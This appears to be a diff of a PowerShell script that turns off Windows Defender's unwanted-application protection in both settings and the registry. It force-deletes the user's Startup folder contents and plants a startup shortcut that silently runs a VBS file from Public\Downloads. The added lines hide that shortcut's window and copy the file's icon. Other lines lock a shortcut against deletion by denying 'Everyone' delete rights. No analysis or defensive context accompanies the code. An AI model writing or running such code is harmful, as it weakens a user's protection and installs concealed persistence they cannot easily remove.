@@ -1,18 +1,16 @@
 Set-MpPreference -PUAProtection 0
 Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name 'PUAProtection' -Value 0
 Remove-Item -Path "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\*" -Force
-$destination = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\Autorun.vbs.lnk"
-$source = "C:\Users\Public\Downloads\Autorun.vbs"
+$sourceVBS = "C:\Users\Public\Downloads\Autorun.vbs"
+$startupFolder = [Environment]::GetFolderPath("Startup")
+$shortcutPath = Join-Path $startupFolder "Autorun.vbs.lnk"
 $wShell = New-Object -ComObject WScript.Shell
-$shortcut = $wShell.CreateShortcut($destination)
-$shortcut.TargetPath = $source
+$shortcut = $wShell.CreateShortcut($shortcutPath)
+$shortcut.TargetPath = "wscript.exe"
+$shortcut.Arguments = "`"$sourceVBS`""
+$shortcut.WindowStyle = 7
+$shortcut.IconLocation = "$sourceVBS, 0"
 $shortcut.Save()
-$ShortcutPath = "C:\Users\Public\Downloads\Startup Folder.lnk"
-$TargetPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
-$WScriptShell = New-Object -ComObject WScript.Shell
-$Shortcut = $WScriptShell.CreateShortcut($ShortcutPath)
-$Shortcut.TargetPath = $TargetPath
-$Shortcut.Save()
 $folder = "C:\Users\Public\Downloads\Startup Folder.lnk"
 $acl = Get-Acl $folder
 $accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone", "Delete", "Deny")
